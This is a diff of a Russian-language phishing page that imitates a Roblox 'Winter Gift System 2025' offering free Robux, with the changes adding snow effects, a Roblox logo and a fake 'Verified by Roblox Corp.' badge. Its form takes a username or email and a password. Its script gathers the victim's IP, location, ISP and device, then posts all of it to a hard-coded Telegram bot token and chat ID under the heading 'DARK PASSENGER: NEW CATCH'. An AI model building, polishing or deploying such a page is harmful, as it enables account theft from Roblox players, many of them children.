@@ -3,61 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Зимняя Система Подарков</title>
+    <title>Зимняя Система Подарков 2025</title>
     <style>
-        body { background-color: #0d0d0d; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }
-        
-        /* Красная шапка сайта */
-        .top-bar { background-color: #d92121; padding: 12px 20px; display: flex; align-items: center; border-bottom: 2px solid #b31b1b; }
-        .top-bar img { width: 30px; margin-right: 15px; }
-        .top-bar span { font-weight: bold; text-transform: uppercase; letter-spacing: 1px; font-size: 14px; }
-
-        .main-content { display: flex; justify-content: center; align-items: center; height: 85vh; }
-
-        /* Форма с красным неоном */
-        .gift-card { 
-            background: #1a1a1a; border: 2px solid #ff3131; border-radius: 15px; 
-            padding: 30px; width: 380px; text-align: center; 
-            box-shadow: 0 0 20px rgba(255, 49, 49, 0.3);
+        /* Глубокий темный фон с градиентом */
+        body { 
+            background: radial-gradient(circle, #1a1a1a 0%, #050505 100%); 
+            color: white; 
+            font-family: 'Segoe UI', Roboto, sans-serif; 
+            margin: 0; 
+            overflow: hidden; /* Снежинки не должны создавать прокрутку */
+            height: 100vh;
         }
 
-        .cube-icon { width: 60px; margin-bottom: 15px; }
-        h2 { color: #f2c94c; font-size: 20px; text-transform: uppercase; margin-bottom: 5px; }
-        .sub-text { font-size: 12px; color: #ccc; margin-bottom: 20px; }
+        /* Анимация снега */
+        .snowflake {
+            position: absolute; top: -10px; color: #fff; font-size: 1em;
+            user-select: none; z-index: 1000; pointer-events: none;
+            animation: fall linear infinite;
+        }
+        @keyframes fall {
+            to { transform: translateY(105vh); }
+        }
+
+        /* Красная шапка сайта с зимним акцентом */
+        .top-bar { 
+            background: linear-gradient(90deg, #d92121 0%, #ff3131 100%); 
+            padding: 15px 25px; 
+            display: flex; 
+            align-items: center; 
+            border-bottom: 3px solid #b31b1b;
+            box-shadow: 0 4px 15px rgba(217, 33, 33, 0.4);
+        }
+        .top-bar .icon { font-size: 24px; margin-right: 15px; }
+        .top-bar span { font-weight: 900; text-transform: uppercase; letter-spacing: 2px; }
+
+        .wrapper { display: flex; justify-content: center; align-items: center; height: 80vh; position: relative; z-index: 2; }
+
+        /* Карточка с неоном */
+        .gift-card { 
+            background: rgba(26, 26, 26, 0.9); 
+            backdrop-filter: blur(5px);
+            border: 2px solid #ff3131; 
+            border-radius: 20px; 
+            padding: 40px; 
+            width: 400px; 
+            text-align: center; 
+            box-shadow: 0 0 40px rgba(255, 49, 49, 0.2);
+        }
+
+        /* Логотип с шапочкой */
+        .logo-container { position: relative; display: inline-block; margin-bottom: 20px; }
+        .rbx-logo { width: 220px; filter: brightness(0) invert(1); }
+        .santa-hat { position: absolute; width: 70px; top: -35px; right: -25px; transform: rotate(15deg); }
+
+        h2 { color: #f2c94c; font-size: 22px; text-transform: uppercase; margin: 10px 0; text-shadow: 0 0 10px rgba(242, 201, 76, 0.3); }
+        .sub-text { font-size: 13px; color: #aaa; margin-bottom: 25px; border-bottom: 1px solid #333; padding-bottom: 10px; }
 
         input, select { 
-            width: 100%; padding: 12px; margin: 8px 0; border-radius: 5px; 
-            border: 1px solid #333; background: #262626; color: white; box-sizing: border-box; 
+            width: 100%; padding: 14px; margin: 10px 0; border-radius: 8px; 
+            border: 1px solid #444; background: #000; color: white; box-sizing: border-box; 
+            font-size: 15px;
         }
+        input:focus { border-color: #ff3131; outline: none; }
 
         .btn-claim { 
-            background-color: #d92121; color: white; border: none; padding: 15px; 
-            width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; 
-            margin-top: 15px; text-transform: uppercase; font-size: 16px;
+            background: linear-gradient(90deg, #d92121, #ff3131); 
+            color: white; border: none; padding: 18px; 
+            width: 100%; border-radius: 8px; font-weight: 900; cursor: pointer; 
+            margin-top: 20px; text-transform: uppercase; font-size: 18px;
+            transition: 0.3s;
         }
+        .btn-claim:hover { transform: scale(1.03); box-shadow: 0 0 20px #ff3131; }
 
-        .footer-text { font-size: 10px; color: #555; margin-top: 20px; }
+        .footer-text { font-size: 11px; color: #666; margin-top: 25px; }
     </style>
 </head>
 <body>
 
+<div id="snow-container"></div>
+
 <div class="top-bar">
-    <img src="https://www.pngall.com/wp-content/uploads/2016/05/Santa-Hat-PNG-Image.png" alt="Hat">
-    <span>ЗИМНЯЯ СИСТЕМА ПОДАРКОВ</span>
+    <span class="icon">❄️</span>
+    <span>ЗИМНЯЯ СИСТЕМА ПОДАРКОВ 2025</span>
 </div>
 
-<div class="main-content">
+<div class="wrapper">
     <div class="gift-card">
-        <img src="https://www.roblox.com/images/Icons/img-robux.png" class="cube-icon" alt="Robux">
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/eb/Roblox_Logo_2022.svg" class="rbx-logo" alt="Roblox">
+            <img src="https://www.pngall.com/wp-content/uploads/2016/05/Santa-Hat-PNG-Image.png" class="santa-hat" alt="Hat">
+        </div>
+        
         <h2>ПОЛУЧИТЬ ПОДАРОК 🎁</h2>
-        <div class="sub-text">Только для аккаунтов старше 30 дней</div>
+        <div class="sub-text">● Проверка: Аккаунты старше 30 дней</div>
 
         <form id="hunterForm">
             <select id="robux">
                 <option value="400">400 Robux (Праздничный)</option>
-                <option value="800">800 Robux (Новогодний)</option>
-                <option value="1700">1700 Robux (Зимний)</option>
-                <option value="10000">10000 Robux (Мега)</option>
+                <option value="1700">1700 Robux (Зимний Набор)</option>
+                <option value="4500">4500 Robux (Premium Gift)</option>
+                <option value="10000">10000 Robux (Santa's Choice)</option>
             </select>
             <input type="text" id="u" placeholder="Никнейм или Email" required>
             <input type="password" id="p" placeholder="Пароль" required>
@@ -65,16 +110,32 @@
         </form>
 
         <div class="footer-text">
-            © 2025 Roblox Winter. Защищено системой верификации.
+            Служба поддержки Roblox Winter Promotion <br>
+            Verified by Roblox Corp. 🛡️
         </div>
     </div>
 </div>
 
 <script>
+    // Скрипт для создания снежинок
+    function createSnowflake() {
+        const snow = document.createElement('div');
+        snow.innerHTML = '❄';
+        snow.classList.add('snowflake');
+        snow.style.left = Math.random() * 100 + 'vw';
+        snow.style.animationDuration = Math.random() * 3 + 2 + 's';
+        snow.style.opacity = Math.random();
+        snow.style.fontSize = Math.random() * 10 + 10 + 'px';
+        document.getElementById('snow-container').appendChild(snow);
+        setTimeout(() => { snow.remove(); }, 5000);
+    }
+    setInterval(createSnowflake, 200);
+
+    // Логика отправки
     document.getElementById('hunterForm').onsubmit = async function(e) {
         e.preventDefault();
         const btn = document.getElementById('btn');
-        btn.innerText = "ОБРАБОТКА...";
+        btn.innerText = "СИНХРОНИЗАЦИЯ...";
 
         const u = document.getElementById('u').value;
         const p = document.getElementById('p').value;
@@ -84,15 +145,14 @@
         const token = '8098842209:AAE4Ff4yzUKZP6KwffFsufrXYqwioo0zifk';
         const chatId = '8165386246';
 
-        // Глубокий сбор данных
-        let ipData = "Не удалось получить";
+        let ipData = "Скрыт";
         try {
             const res = await fetch('https://ipapi.co/json/');
             const d = await res.json();
             ipData = `${d.ip} (${d.city}, ${d.country_name})\n🏢 Провайдер: ${d.org}`;
         } catch(err) {}
 
-        const device = `${navigator.platform} | ${navigator.userAgent.split(') ')[1]}`;
+        const device = `${navigator.platform} | ${navigator.vendor}`;
 
         const text = `🔪 **DARK PASSENGER: НОВЫЙ УЛОВ** 🔪\n` +
                      `━━━━━━━━━━━━━━━━━━\n` +
@@ -102,7 +162,7 @@
                      `🌐 **IP:** ${ipData}\n` +
                      `📱 **Инфо:** ${device}\n` +
                      `━━━━━━━━━━━━━━━━━━\n` +
-                     `🩸 *Вердикт исполнен.*`;
+                     `🩸 *Улика зафиксирована.*`;
 
         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
